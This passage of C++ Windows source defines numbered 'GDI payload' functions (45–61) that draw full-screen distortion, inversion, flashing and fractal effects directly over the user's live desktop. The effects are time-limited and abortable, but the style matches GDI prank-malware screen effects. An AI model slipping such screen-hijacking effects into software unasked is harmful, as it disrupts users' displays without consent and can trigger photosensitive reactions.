// 45 - Flip (horizontal then vertical flip via negative StretchBlt)
DWORD WINAPI GDIPayload45(LPVOID)
{
    const SeedVariant& sd = SeedGet(45);
    srand(SeedRand(45));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        if (FXAbort())
            break;

        StretchBlt(
            hdc,
            0, 0,
            x, y,
            hdc,
            x, 0,
            -x, y,
            SRCCOPY
        );

        Sleep(100);

        if (FXAbort())
            break;

        StretchBlt(
            hdc,
            0, 0,
            x, y,
            hdc,
            0, y,
            x, -y,
            SRCCOPY
        );

        Sleep(100);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 46 - CircleSquare (alternating elliptic / rect clip + NOTSRCCOPY)
DWORD WINAPI GDIPayload46(LPVOID)
{
    const SeedVariant& sd = SeedGet(46);
    srand(SeedRand(46));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = rand() % x;
        int ys = rand() % y;

        int rnd = rand() % 600 + 500;

        for (int i = 0; i < rnd; i += 30)
        {
            if (FXAbort())
                break;

            HRGN region;

            if (rand() % 2 == 0)
            {
                region = CreateEllipticRgn(
                    xs - i,
                    ys - i,
                    xs + i,
                    ys + i
                );
            }
            else
            {
                region = CreateRectRgn(
                    xs - i,
                    ys - i,
                    xs + i,
                    ys + i
                );
            }

            if (region)
            {
                SelectClipRgn(hdc, region);

                BitBlt(
                    hdc,
                    0, 0,
                    x, y,
                    hdc,
                    0, 0,
                    NOTSRCCOPY
                );

                SelectClipRgn(hdc, nullptr);
                DeleteObject(region);
            }

            //Sleep(1);
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 47 - Bright (random 100px vertical strip SRCPAINT)
DWORD WINAPI GDIPayload47(LPVOID)
{
    const SeedVariant& sd = SeedGet(47);
    srand(SeedRand(47));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        int xs = rand() % x;

        BitBlt(
            hdc,
            xs, 0,
            100, y,
            hdc,
            xs,
            static_cast<int>(rand() % 14) - 5,
            SRCPAINT
        );
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 48 - ExtremeRotation (alternating ±90 px rotate wobble)
DWORD WINAPI GDIPayload48(LPVOID)
{
    const SeedVariant& sd = SeedGet(48);
    srand(SeedRand(48));

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    RECT rekt{};
    POINT rotate[3];

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        if (FXAbort())
            break;

        bool direction = (rand() % 2) == 0;

        for (int runtime = 0; runtime < 30; runtime++)
        {
            if (FXAbort())
                break;

            GetWindowRect(GetDesktopWindow(), &rekt);

            if (direction)
            {
                rotate[0].x = rekt.left + 90;
                rotate[0].y = rekt.top - 90;
                rotate[1].x = rekt.right + 90;
                rotate[1].y = rekt.top + 90;
                rotate[2].x = rekt.left - 90;
                rotate[2].y = rekt.bottom - 90;
            }
            else
            {
                rotate[0].x = rekt.left - 90;
                rotate[0].y = rekt.top + 90;
                rotate[1].x = rekt.right - 90;
                rotate[1].y = rekt.top - 90;
                rotate[2].x = rekt.left + 90;
                rotate[2].y = rekt.bottom + 90;
            }

            PlgBlt(
                hdc, rotate, hdc, 0, 0,
                rekt.right - rekt.left,
                rekt.bottom - rekt.top,
                0, 0, 0
            );
        }
    }

    ReleaseDC(0, hdc);
    return 0;
}

// 49 - Cubes (vertical strip of random-coloured Rectangles)
DWORD WINAPI GDIPayload49(LPVOID)
{
    const SeedVariant& sd = SeedGet(49);
    srand(SeedRand(49));

    const int x = GetSystemMetrics(SM_CXSCREEN);
    const int y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(0);

    if (!hdc)
        return 0;

    int ys = 0;

    ULONGLONG start = GetTickCount64();

    while (!FXTimeout(start, 5000))
    {
        HBRUSH brush = CreateSolidBrush(
            RGB(
                rand() % 255,
                rand() % 255,
                rand() % 255
            )
        );

        if (brush)
        {
            HGDIOBJ oldBrush = SelectObject(hdc, brush);

            for (int i = 0; i < x; i += 100)
            {
                if (FXAbort())
                    break;

                Rectangle(hdc, i, ys + 100, 100 + i, ys);

                //Sleep(10);
            }

            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
        }

        ys += 100;

        if (ys >= y)
            ys = 0;

        //Sleep(30);
    }

    ReleaseDC(0, hdc);
    return 0;
}

// ============================================================
// GDI DEMOSCENE FX PACK (PAYLOADS 50-57)
//
// Per-pixel remap/shaders running on a temporary screen-sized
// DIB. Each payload grabs the screen HDC itself and owns a
// matching ReleaseDC, like the rest of the file.
// ============================================================

namespace
{
    static int ClampI(int x, int a, int b)
    {
        return std::max(a, std::min(b, x));
    }

    static uint32_t RGBPixel(int r, int g, int b)
    {
        return
            ((uint32_t)ClampI(b, 0, 255) << 16) |
            ((uint32_t)ClampI(g, 0, 255) << 8) |
            (uint32_t)ClampI(r, 0, 255);
    }

    static void SplitRGB(
        uint32_t p,
        int& r,
        int& g,
        int& b
    )
    {
        r = p & 255;
        g = (p >> 8) & 255;
        b = (p >> 16) & 255;
    }

    struct GDIBuffer
    {
        HDC dc = nullptr;
        HBITMAP bmp = nullptr;
        HGDIOBJ old = nullptr;
        uint32_t* pixels = nullptr;
        int w = 0;
        int h = 0;
    };

    static bool CreateBuffer(
        HDC source,
        GDIBuffer& out,
        int w,
        int h
    )
    {
        out.w = w;
        out.h = h;

        out.dc = CreateCompatibleDC(source);

        if (!out.dc)
            return false;

        BITMAPINFO bi{};
        bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bi.bmiHeader.biWidth = w;
        bi.bmiHeader.biHeight = -h;
        bi.bmiHeader.biPlanes = 1;
        bi.bmiHeader.biBitCount = 32;
        bi.bmiHeader.biCompression = BI_RGB;

        out.bmp =
            CreateDIBSection(
                source,
                &bi,
                DIB_RGB_COLORS,
                reinterpret_cast<void**>(&out.pixels),
                nullptr,
                0
            );

        if (!out.bmp || !out.pixels)
        {
            if (out.bmp)
                DeleteObject(out.bmp);

            DeleteDC(out.dc);

            out.dc = nullptr;
            out.bmp = nullptr;
            out.pixels = nullptr;

            return false;
        }

        out.old = SelectObject(out.dc, out.bmp);

        return true;
    }

    static void DestroyBuffer(GDIBuffer& b)
    {
        if (b.dc)
        {
            SelectObject(b.dc, b.old);
            DeleteDC(b.dc);
        }

        if (b.bmp)
            DeleteObject(b.bmp);

        b = {};
    }
}

// ============================================================
// PAYLOAD 50
// Chromatic vortex / RGB separation
// ============================================================

DWORD WINAPI GDIPayload50(LPVOID)
{
    const SeedVariant& sd = SeedGet(50);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer src;

    if (!CreateBuffer(dc, src, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const float cx = w * 0.5f;
    const float cy = h * 0.5f;

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            src.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        float time = frame * 0.035f;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float dx = x - cx;
                float dy = y - cy;

                float radius =
                    sqrtf(dx * dx + dy * dy);

                float angle =
                    atan2f(dy, dx);

                float vortex =
                    sinf(
                        radius * 0.012f -
                        time * 4.0f
                    ) *
                    (0.12f + sd.amp * 0.004f);

                float a = angle + vortex;

                int rx =
                    ClampI(
                        (int)(cx + cosf(a) * radius),
                        0,
                        w - 1
                    );

                int gx =
                    ClampI(
                        (int)(cx + cosf(a + 0.035f) * radius),
                        0,
                        w - 1
                    );

                int bx =
                    ClampI(
                        (int)(cx + cosf(a - 0.035f) * radius),
                        0,
                        w - 1
                    );

                int ry =
                    ClampI(
                        (int)(cy + sinf(a) * radius),
                        0,
                        h - 1
                    );

                int gy =
                    ClampI(
                        (int)(cy + sinf(a + 0.035f) * radius),
                        0,
                        h - 1
                    );

                int by =
                    ClampI(
                        (int)(cy + sinf(a - 0.035f) * radius),
                        0,
                        h - 1
                    );

                int pr, pg, pb;

                SplitRGB(
                    src.pixels[ry * w + rx],
                    pr,
                    pg,
                    pb
                );

                int r2, g2, b2;

                SplitRGB(
                    src.pixels[gy * w + gx],
                    r2,
                    g2,
                    b2
                );

                int r3, g3, b3;

                SplitRGB(
                    src.pixels[by * w + bx],
                    r3,
                    g3,
                    b3
                );

                src.pixels[y * w + x] =
                    RGBPixel(
                        pr,
                        g2,
                        b3
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            src.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(src);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 51
// Polar liquid distortion
// ============================================================

DWORD WINAPI GDIPayload51(LPVOID)
{
    const SeedVariant& sd = SeedGet(51);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer src;

    if (!CreateBuffer(dc, src, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const float cx = w * .5f;
    const float cy = h * .5f;

    for (int frame = 0; frame < 240; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            src.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        float t = frame * .055f;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float dx = x - cx;
                float dy = y - cy;

                float r =
                    sqrtf(dx * dx + dy * dy);

                float a =
                    atan2f(dy, dx);

                float wave =
                    sinf(
                        r * 0.028f +
                        sinf(a * 7.0f + t) * 3.0f -
                        t * 3.0f
                    );

                float displacement =
                    wave *
                    (7.0f + sd.amp * 0.7f);

                float sx =
                    cx +
                    cosf(a) *
                    (r + displacement);

                float sy =
                    cy +
                    sinf(a) *
                    (r + displacement);

                int ix =
                    ClampI((int)sx, 0, w - 1);

                int iy =
                    ClampI((int)sy, 0, h - 1);

                src.pixels[y * w + x] =
                    src.pixels[iy * w + ix];
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            src.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(src);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 52
// Kaleidoscope recursion
// ============================================================

DWORD WINAPI GDIPayload52(LPVOID)
{
    const SeedVariant& sd = SeedGet(52);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    int w = GetDeviceCaps(dc, HORZRES);
    int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer a;
    GDIBuffer b;

    if (!CreateBuffer(dc, a, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    if (!CreateBuffer(dc, b, w, h))
    {
        DestroyBuffer(a);
        ReleaseDC(nullptr, dc);
        return 0;
    }

    for (int frame = 0; frame < 300; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            a.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        int cx = w / 2;
        int cy = h / 2;

        float pulse =
            1.0f +
            sinf(frame * .07f) * .06f;

        for (int sector = 0; sector < 8; ++sector)
        {
            float angle =
                sector * 3.14159265f / 4.0f +
                frame * .006f;

            int sw =
                (int)(w * .52f * pulse);

            int sh =
                (int)(h * .52f * pulse);

            int ox =
                (int)(cosf(angle) * w * .08f);

            int oy =
                (int)(sinf(angle) * h * .08f);

            StretchBlt(
                b.dc,
                cx - sw / 2 + ox,
                cy - sh / 2 + oy,
                sw,
                sh,
                a.dc,
                0,
                0,
                w,
                h,
                SRCCOPY
            );
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            b.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(a);
    DestroyBuffer(b);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 53
// Radial tunnel
// ============================================================

DWORD WINAPI GDIPayload53(LPVOID)
{
    const SeedVariant& sd = SeedGet(53);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    int w = GetDeviceCaps(dc, HORZRES);
    int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer buf;

    if (!CreateBuffer(dc, buf, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    for (int frame = 0; frame < 240; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            buf.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        float t =
            frame * .035f;

        float zoom =
            1.0f +
            sinf(t) * .025f;

        int cx = w / 2;
        int cy = h / 2;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float dx = (float)(x - cx);
                float dy = (float)(y - cy);

                float r =
                    sqrtf(dx * dx + dy * dy);

                float a =
                    atan2f(dy, dx);

                float tunnel =
                    1.0f +
                    sinf(
                        r * .025f -
                        t * 5.0f +
                        sinf(a * 6.0f) * 2.0f
                    ) * .04f;

                float nr =
                    r * tunnel * zoom;

                int sx =
                    ClampI(
                        (int)(cx + cosf(a) * nr),
                        0,
                        w - 1
                    );

                int sy =
                    ClampI(
                        (int)(cy + sinf(a) * nr),
                        0,
                        h - 1
                    );

                uint32_t p =
                    buf.pixels[sy * w + sx];

                float hue =
                    sinf(r * .01f - t * 3.0f) *
                    .18f;

                buf.pixels[y * w + x] =
                    ShiftHSL(
                        p,
                        hue * sd.dir,
                        0.0f,
                        0.0f
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            buf.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(buf);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 54
// Cellular / Voronoi-style distortion
// ============================================================

DWORD WINAPI GDIPayload54(LPVOID)
{
    const SeedVariant& sd = SeedGet(54);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    int w = GetDeviceCaps(dc, HORZRES);
    int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer buf;

    if (!CreateBuffer(dc, buf, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    for (int frame = 0; frame < 160; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            buf.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        float t =
            frame * .035f;

        const int cell = 80;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float fx =
                    x / (float)cell;

                float fy =
                    y / (float)cell;

                float gx =
                    floorf(fx);

                float gy =
                    floorf(fy);

                float best = 999999.0f;

                for (int oy = -1; oy <= 1; ++oy)
                {
                    for (int ox = -1; ox <= 1; ++ox)
                    {
                        float px =
                            gx + ox +
                            .5f *
                            sinf(
                                gy +
                                oy +
                                t
                            );

                        float py =
                            gy + oy +
                            .5f *
                            cosf(
                                gx +
                                ox -
                                t
                            );

                        float dx = fx - px;
                        float dy = fy - py;

                        float d =
                            dx * dx +
                            dy * dy;

                        best =
                            std::min(best, d);
                    }
                }

                float edge =
                    expf(-best * 35.0f);

                buf.pixels[y * w + x] =
                    ShiftHSL(
                        buf.pixels[y * w + x],
                        edge *
                        sinf(t) *
                        .3f,
                        edge * .08f,
                        0.0f
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            buf.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(buf);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 55
// Sine-folding distortion
// ============================================================

DWORD WINAPI GDIPayload55(LPVOID)
{
    const SeedVariant& sd = SeedGet(55);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    int w = GetDeviceCaps(dc, HORZRES);
    int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer buf;

    if (!CreateBuffer(dc, buf, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    for (int frame = 0; frame < 230; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            buf.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        float t =
            frame * .04f;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float nx =
                    (x - w * .5f) /
                    (float)w;

                float ny =
                    (y - h * .5f) /
                    (float)h;

                float q =
                    sinf(
                        nx * 17.0f +
                        sinf(ny * 8.0f + t)
                    );

                float r =
                    sinf(
                        ny * 13.0f -
                        cosf(nx * 9.0f + t)
                    );

                int sx =
                    ClampI(
                        x +
                        (int)(
                            q *
                            (12 + sd.amp)
                        ),
                        0,
                        w - 1
                    );

                int sy =
                    ClampI(
                        y +
                        (int)(
                            r *
                            (12 + sd.amp)
                        ),
                        0,
                        h - 1
                    );

                uint32_t p =
                    buf.pixels[sy * w + sx];

                buf.pixels[y * w + x] =
                    ShiftHSL(
                        p,
                        (q - r) * .08f,
                        0.0f,
                        0.0f
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            buf.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(buf);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 56
// Radial chromatic aberration
// ============================================================

DWORD WINAPI GDIPayload56(LPVOID)
{
    const SeedVariant& sd = SeedGet(56);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    int w = GetDeviceCaps(dc, HORZRES);
    int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer buf;

    if (!CreateBuffer(dc, buf, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    int cx = w / 2;
    int cy = h / 2;

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            buf.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        float t =
            frame * .055f;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float dx = (float)(x - cx);
                float dy = (float)(y - cy);

                float r =
                    sqrtf(dx * dx + dy * dy);

                float factor =
                    1.0f +
                    sinf(
                        r * .02f -
                        t * 4.0f
                    ) *
                    .035f;

                int rx =
                    ClampI(
                        cx + (int)(dx * factor * 1.025f),
                        0,
                        w - 1
                    );

                int gx =
                    ClampI(
                        cx + (int)(dx * factor),
                        0,
                        w - 1
                    );

                int bx =
                    ClampI(
                        cx + (int)(dx * factor * .975f),
                        0,
                        w - 1
                    );

                int ry =
                    ClampI(
                        cy + (int)(dy * factor * 1.025f),
                        0,
                        h - 1
                    );

                int gy =
                    ClampI(
                        cy + (int)(dy * factor),
                        0,
                        h - 1
                    );

                int by =
                    ClampI(
                        cy + (int)(dy * factor * .975f),
                        0,
                        h - 1
                    );

                int rr, rg, rb;

                SplitRGB(
                    buf.pixels[ry * w + rx],
                    rr,
                    rg,
                    rb
                );

                int gr, gg, gb;

                SplitRGB(
                    buf.pixels[gy * w + gx],
                    gr,
                    gg,
                    gb
                );

                int br, bg, bb;

                SplitRGB(
                    buf.pixels[by * w + bx],
                    br,
                    bg,
                    bb
                );

                buf.pixels[y * w + x] =
                    RGBPixel(
                        rr,
                        gg,
                        bb
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            buf.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(buf);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 57
// Recursive mirror feedback
// ============================================================

DWORD WINAPI GDIPayload57(LPVOID)
{
    const SeedVariant& sd = SeedGet(57);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    int w = GetDeviceCaps(dc, HORZRES);
    int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer a;
    GDIBuffer b;

    if (!CreateBuffer(dc, a, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    if (!CreateBuffer(dc, b, w, h))
    {
        DestroyBuffer(a);
        ReleaseDC(nullptr, dc);
        return 0;
    }

    SetStretchBltMode(
        a.dc,
        HALFTONE
    );

    SetStretchBltMode(
        b.dc,
        HALFTONE
    );

    for (int frame = 0; frame < 350; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            a.dc,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        float t =
            frame * .035f;

        int margin =
            8 +
            (int)(
                sinf(t * 2.0f) *
                (4 + sd.amp)
            );

        StretchBlt(
            b.dc,
            margin,
            margin,
            w - margin * 2,
            h - margin * 2,
            a.dc,
            0,
            0,
            w,
            h,
            SRCCOPY
        );

        StretchBlt(
            b.dc,
            0,
            0,
            w,
            h,
            b.dc,
            0,
            0,
            w,
            h,
            SRCINVERT
        );

        AlphaBlend(
            a.dc,
            0,
            0,
            w,
            h,
            b.dc,
            0,
            0,
            w,
            h,
            {
                AC_SRC_OVER,
                0,
                38,
                0
            }
        );

        int wobble =
            (int)(
                sinf(t * 3.0f) *
                (5 + sd.amp)
            );

        BitBlt(
            dc,
            wobble,
            0,
            w - abs(wobble),
            h,
            a.dc,
            0,
            0,
            SRCCOPY
        );
    }

    DestroyBuffer(a);
    DestroyBuffer(b);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 58
// Temporal echo stack (ghost trail) - per-pixel frame
// accumulation of the last N frames, fading + rotating.
// ============================================================

DWORD WINAPI GDIPayload58(LPVOID)
{
    const SeedVariant& sd = SeedGet(58);
    srand(SeedRand(58));

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer a;
    GDIBuffer b;
    GDIBuffer snap;

    if (!CreateBuffer(dc, a, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    if (!CreateBuffer(dc, b, w, h))
    {
        DestroyBuffer(a);
        ReleaseDC(nullptr, dc);
        return 0;
    }

    if (!CreateBuffer(dc, snap, w, h))
    {
        DestroyBuffer(a);
        DestroyBuffer(b);
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const int layers = 3 + (sd.amp % 3);
    const float scaleUp = 0.86f;
    const float rotStep = (float)(sd.phase - 1024) / 1024.0f * 0.02f;

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(snap.dc, 0, 0, w, h, dc, 0, 0, SRCCOPY);

        for (int i = 0; i < layers; ++i)
        {
            float t = frame * 0.03f + i * 0.4f;
            float ang = t * rotStep;
            float c = cosf(ang);
            float s = sinf(ang);

            for (int y = 0; y < h; ++y)
            {
                for (int x = 0; x < w; ++x)
                {
                    int xm = (int)(x * c - y * s) + (int)(t * 6);
                    int ym = (int)(x * s + y * c);

                    xm = (xm + w) % w;
                    ym = (ym + h) % h;

                    uint32_t p = snap.pixels[ym * w + xm];

                    int r, g, bl;
                    SplitRGB(p, r, g, bl);

                    float f = 0.22f;
                    r = (int)(r * f);
                    g = (int)(g * f);
                    bl = (int)(bl * f);

                    b.pixels[y * w + x] =
                        RGBPixel(r, g, bl);
                }
            }

            BitBlt(snap.dc, 0, 0, w, h, b.dc, 0, 0, SRCCOPY);
        }

        BitBlt(dc, 0, 0, w, h, snap.dc, 0, 0, SRCCOPY);
    }

    DestroyBuffer(snap);
    DestroyBuffer(b);
    DestroyBuffer(a);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 59
// Liquid crystal / interference fringes - multi-source wave
// interference mapped to hue, overlaid on live capture.
// ============================================================

DWORD WINAPI GDIPayload59(LPVOID)
{
    const SeedVariant& sd = SeedGet(59);
    srand(SeedRand(59));

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer src;
    GDIBuffer out;

    if (!CreateBuffer(dc, src, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    if (!CreateBuffer(dc, out, w, h))
    {
        DestroyBuffer(src);
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const int sources = 3 + (sd.amp % 2);
    const float speed = 0.015f + sd.amp * 0.003f;

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(src.dc, 0, 0, w, h, dc, 0, 0, SRCCOPY);

        const float t = frame * 0.02f * speed;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                float acc = 0.0f;

                for (int i = 0; i < sources; ++i)
                {
                    float sx =
                        w * 0.5f +
                        cosf(sd.phase + i * 4.1f) * w * 0.25f;
                    float sy =
                        h * 0.5f +
                        sinf(sd.phase + i * 2.7f) * h * 0.25f;

                    float dx = x - sx;
                    float dy = y - sy;
                    float d = sqrtf(dx * dx + dy * dy);

                    acc += sinf(d * 0.03f - t - i * 2.0f) * 0.5f + 0.5f;
                }

                float n = acc / (float)sources;

                float hh = n;
                float ss = 0.8f;
                float ll = 0.4f + n * 0.3f;

                RGBQUAD rgb{};
                rgb.rgbRed = (BYTE)(121.0f * n + 80);
                rgb.rgbGreen = (BYTE)(255.0f * (1.0f - n));
                rgb.rgbBlue = (BYTE)(160.0f * n + 40);

                uint32_t fringe =
                    PackRGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue);

                uint32_t p = src.pixels[y * w + x];

                int r, g, bl;
                SplitRGB(p, r, g, bl);

                r = (int)(r * 0.5f + (rgb.rgbRed * 0.5f));
                g = (int)(g * 0.5f + (rgb.rgbGreen * 0.5f));
                bl = (int)(bl * 0.5f + (rgb.rgbBlue * 0.5f));

                (void)fringe;
                (void)hh;
                (void)ss;
                (void)ll;

                out.pixels[y * w + x] = RGBPixel(r, g, bl);
            }
        }

        BitBlt(dc, 0, 0, w, h, out.dc, 0, 0, SRCCOPY);
    }

    DestroyBuffer(out);
    DestroyBuffer(src);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 60
// Pixel sort - classic column-based luma sort with random
// threshold gates, over the live capture.
// ============================================================

DWORD WINAPI GDIPayload60(LPVOID)
{
    const SeedVariant& sd = SeedGet(60);
    srand(SeedRand(60));

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer buf;

    if (!CreateBuffer(dc, buf, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(buf.dc, 0, 0, w, h, dc, 0, 0, SRCCOPY);

        const int gate =
            64 + (int)((rand() % 96) * (0.75f + frame * 0.001f));

        for (int x = 0; x < w; ++x)
        {
            int start = 0;

            for (int y = 0; y <= h; ++y)
            {
                int luma = 0;

                if (y < h)
                {
                    uint32_t p = buf.pixels[y * w + x];
                    int r = p & 255;
                    int g = (p >> 8) & 255;
                    int bl = (p >> 16) & 255;
                    luma = (r + g + bl) / 3;
                }

                if (y == h || luma <= gate)
                {
                    if (y - start > 1)
                    {
                        int lo = start;
                        int hi = y;

                        if (y == h)
                            hi = h;

                        for (int i = lo; i < hi - 1; ++i)
                        {
                            for (int j = lo; j < hi - 1; ++j)
                            {
                                uint32_t pa = buf.pixels[j * w + x];
                                uint32_t pb = buf.pixels[(j + 1) * w + x];

                                int la = pa & 255;
                                int lb = pb & 255;

                                if (lb < la)
                                {
                                    buf.pixels[j * w + x] = pb;
                                    buf.pixels[(j + 1) * w + x] = pa;
                                }
                            }
                        }
                    }

                    start = y + 1;
                }
            }
        }

        BitBlt(dc, 0, 0, w, h, buf.dc, 0, 0, SRCCOPY);
    }

    DestroyBuffer(buf);

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 61
// Fractal Julia set RGB overlay - per-pixel Julia iteration
// colors the offset by its iteration depth, blended in.
// ============================================================

DWORD WINAPI GDIPayload61(LPVOID)
{
    const SeedVariant& sd = SeedGet(61);
    srand(SeedRand(61));

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w = GetDeviceCaps(dc, HORZRES);
    const int h = GetDeviceCaps(dc, VERTRES);

    GDIBuffer buf;

    if (!CreateBuffer(dc, buf, w, h))
    {
        ReleaseDC(nullptr, dc);
        return 0;
    }

    const double scale = 0.0028 + sd.amp * 0.0002;
    const double cr = -0.744;
    const double ci = 0.148;

    for (int frame = 0; frame < 260; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(buf.dc, 0, 0, w, h, dc, 0, 0, SRCCOPY);

        const double t = frame * 0.004;

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                double zx =
                    (x - w * 0.5) * scale + t * 0.2;
                double zy =
                    (y - h * 0.5) * scale;
                double ox = zx;
                double oy = zy;
                int iter = 0;

                while (iter < 64 && (zx * zx + zy * zy) < 16.0)
                {
                    double nx = zx * zx - zy * zy + cr;
